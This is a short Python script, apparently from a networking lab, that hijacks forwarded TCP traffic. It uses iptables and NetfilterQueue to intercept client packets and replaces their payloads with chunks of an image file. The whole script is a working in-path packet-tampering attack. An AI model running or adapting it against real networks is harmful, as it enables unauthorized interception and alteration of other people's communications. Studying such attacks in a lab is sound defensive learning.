import os
from struct import pack
from scapy.all import IP, TCP, scapy, send
import time
from netfilterqueue import NetfilterQueue as NFQ  

#YOU HAVE TO USE bubuntu

FIN = 0x01
SYN = 0x02
PSH = 0x08
ACK = 0x10


hacked_seq = dict()
hacked_ack = dict()

client_ip = "172.10.0.1"
server_ip = "198.10.0.2"


heck = []
idx= 0
with open("poza_router.png", "rb") as image:
  f = image.read(1000)
  while f:
      heck.append(f)
      f = image.read(1000)


def proceseaza(pachet):
    global client_ip
    global server_ip
    global hacked_seq 
    global hacked_ack
    global heck,idx

    octeti = pachet.get_payload()
    scapy_packet = IP(octeti)
    print("Pachet inainte: ")
    scapy_packet.show()

    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP):
        flags = scapy_packet[TCP].flags
        if flags & PSH:
            if scapy_packet[IP].src == server_ip:
                print("SUNT SERVER")
            else:
                scapy_packet = IP(
                    src=scapy_packet[IP].src,
                    dst=scapy_packet[IP].dst
                ) / TCP(
                    sport=scapy_packet[TCP].sport,
                    dport=scapy_packet[TCP].dport,
                    seq=scapy_packet[TCP].seq,
                    ack=scapy_packet[TCP].ack,
                    flags=scapy_packet[TCP].flags
                ) / (heck[idx])
                idx+=1
                pachet.set_payload(bytes(scapy_packet))
                pachet.accept()
                return
    pachet.set_payload(bytes(scapy_packet))
    pachet.accept()

print("Started to alter packages")
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 6")
    queue.bind(6, proceseaza)
    queue.run()
except KeyboardInterrupt:
    # os.system("iptables -D FORWARD 1")
    queue.unbind()
    print("failed")
